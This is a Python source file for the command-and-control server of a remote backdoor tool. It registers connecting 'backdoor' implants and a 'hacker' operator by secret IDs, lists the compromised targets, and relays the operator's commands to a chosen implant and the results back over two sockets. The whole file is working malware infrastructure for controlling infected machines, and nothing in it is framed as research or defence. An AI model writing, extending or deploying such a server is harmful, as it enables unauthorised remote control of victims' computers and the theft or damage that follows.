import socket
import os
import threading

from dotenv import load_dotenv
from backdoor import handleCommands

from communication import ObjectCommunication, ByteCommunication

class Hacker:
    def __init__(self, client:socket.socket, client1:socket.socket) -> None:
        self.client = client
        self.mainSock = ObjectCommunication(client)
        self.fastSock = ByteCommunication(client1)

        self.inDoor = False

class Target:
    def __init__(self, client:socket.socket, addr, client1:socket.socket) -> None:
        self.client = client
        self.addr = addr

        self.mainSock = ObjectCommunication(client)
        self.fastSock = ByteCommunication(client1)
    

class Server:
    def __init__(self, ip, port, port1) -> None:
        print(f"{OK} Setting up server...")

        self.mainSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.mainSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.mainSock.bind((ip, port))
        self.mainSock.listen(0)

        self.fastSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.fastSock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.fastSock.bind((ip, port1))
        self.fastSock.listen(0)
        
        print(f"{OK} Running server on ip: {ip} | port: {port}")

        self.clients = []
        self.hacker:Hacker 

    def setConnection(self, client:socket.socket, addr, client1:socket.socket, identity):
        if identity == BACKDOORID:
            print(f"{OK} Backdoor connected with address: {addr}")

            self.clients.append(Target(client, addr, client1))

        elif identity == HACKERID:
            print(f"{OK} Hacker connected with address: {addr}")

            self.hacker = Hacker(client, client1)
            thread = threading.Thread(target=hackerOverview, args=(self,))
            thread.start()
        
    def sendableClients(self):
        return [{"name":None, "addr":target.addr} for target in self.clients]

def hackerOverview(server:Server):
    hackerComms = server.hacker.mainSock

    while True:
        clientList = server.sendableClients()
        hackerComms.send(clientList)

        action = hackerComms.receive()

        if action["action"] == "exit":
            break

        elif action["action"] == "exitServer":
            for client in server.clients:
                client.mainSock.send(False)
            os._exit(0)

        try:
            action = int(action["action"])
            client = server.clients[action]
            hackerComms.send({"status":True})
            enterBackdoor(server, client)

        except (TypeError, ValueError, IndexError) as e:
            hackerComms.send({"status":False, "msg":"Not a valid choice", "error":e})
        except Exception as e:
            print(f"{ERROR} An error occured : {e}")


def enterBackdoor(server:Server, client:Target):
    hacker = server.hacker

    print(f"{OK} Hacker entered backdoor: {client.addr}")

    def fastSocket(backdoor:Target, hacker:Hacker):
        try:
            while hacker.inDoor:
                print(f"{OK} Waiting for result")
                result = backdoor.fastSock.receive()
                hacker.fastSock.send(result)

                if result == b"0":
                    break
        except Exception as e:
            print(f"{ERROR} An error accured in fastSocket with targetIP: {backdoor.addr} error: {e}")
            
    hacker.inDoor = True

    thread = threading.Thread(target=fastSocket, args=(client, hacker))
    thread.start()

    while hacker.inDoor:
        try:
            command = hacker.mainSock.receive()
            client.mainSock.send(command)

            if command.command == "exit":
                break

            progress = client.mainSock.receive()
            hacker.mainSock.send(progress)
        except Exception as e:
            hacker.mainSock.send(False)
            hacker.fastSock.send(b"0")
            server.clients.remove(client)
            print(f"{ERROR} Something happend when hacker was connected to backdoor : {e}")
            break

    hacker.inDoor = False

    print(f"{OK} Hacker exited backdoor")

def main():
    server = Server(ip, port, port1)

    while True:
        try:
            client, addr = server.mainSock.accept()
            client.settimeout(2)
            id = client.recv(1024)
            client.settimeout(None)

            if id not in [BACKDOORID, HACKERID]:
                raise Exception("Wrong id")

            client1, addr1 = server.fastSock.accept()
            server.setConnection(client, addr, client1, id)
        except Exception as e:
            print(f"{ERROR} Something went wrong connecting to a client : {e}")

load_dotenv()

OK = "[+]"
ERROR = "[-]"

BACKDOORID = os.environ.get("BACKDOORID").encode()
HACKERID = os.environ.get("HACKERID").encode()

ip = os.environ.get("IP")
port = int(os.environ.get("PORT1"))
port1 = int(os.environ.get("PORT2"))

if __name__ == "__main__":
    main()
